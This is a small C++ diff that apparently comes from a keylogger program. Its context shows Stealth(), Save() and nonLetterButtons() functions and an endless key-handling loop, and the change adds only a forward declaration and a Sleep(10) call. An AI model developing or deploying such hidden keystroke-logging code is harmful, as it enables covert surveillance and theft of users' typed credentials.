@@ -4,7 +4,10 @@
 #include <string>
 #include <stdio.h>
 
+
 using namespace std;
+
+int main();
 
 void Save(string text);
 bool nonLetterButtons(int key);
@@ -13,6 +16,7 @@ void Stealth();
 int main()
 {
 	Stealth();
+	Sleep(10);
 	char i;
 
 	while (true)
